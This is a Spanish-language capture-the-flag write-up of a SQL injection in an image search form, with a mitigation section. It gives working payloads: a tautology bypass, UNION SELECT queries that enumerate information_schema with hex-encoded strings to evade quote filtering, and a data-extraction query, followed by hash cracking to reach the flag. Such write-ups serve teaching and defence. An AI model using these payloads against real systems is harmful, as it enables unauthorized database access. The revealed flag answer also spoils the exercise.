# A1 - SQL Injection (II)

Segunda vulnerabilidad de inyección SQL del OWASP Top 10 (2017). Se encuentra en el formulario de búsqueda de imágenes (`Search Images`), donde el número de imagen se inyecta directamente en la consulta SQL.

---

## Pasos para obtener la flag

### 1. Confirmar la vulnerabilidad (Bypass por tautología)

Ingresar en el campo de búsqueda:
```
1 or 1
```
La consulta devuelve todas las imágenes de la tabla. Entre ellas aparece una con nombre `getThe-flag` o similar, confirmando la vulnerabilidad.

---

### 2. Enumerar la estructura de la base de datos (UNION)

La consulta original selecciona **dos columnas**, por lo que todo `UNION SELECT` debe respetar ese número. Las comillas están filtradas, así que los strings se pasan en **hexadecimal**.

**Listar tablas:**
```sql
1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database()
```
Resultado relevante: tabla `list_images`.

**Listar columnas de `list_images`** (`list_images` en hex = `0x6c6973745f696d61676573`):
```sql
1 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573
```
Columnas de interés: `comment` y `title`.

---

### 3. Extraer los datos y obtener la flag

```sql
1 UNION SELECT title, comment FROM list_images
```

Respuesta:
```
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url:   Hack me ?
```

**Proceso:**
1. El hash `1928e8083cf461a51303633093573c46` es MD5 → descifra a `albatroz`
2. Pasar a minúsculas → `albatroz`
3. Aplicar SHA-256 → resultado es la **flag**

> Herramienta recomendada: [CyberChef](https://gchq.github.io/CyberChef/)

---

## Impacto

- **Confidencialidad:** acceso a cualquier dato de la base de datos sin credenciales.
- **Enumeración:** posibilidad de reconstruir toda la estructura interna de la BD desde un simple formulario.

---

## Mitigación

1. **Consultas preparadas (parametrizadas):** la defensa más efectiva; el input se trata siempre como dato literal.
2. **Validación de entradas:** listas blancas para filtrar caracteres no permitidos.
3. **Principio de mínimo privilegio:** el usuario de BD solo accede a lo estrictamente necesario.
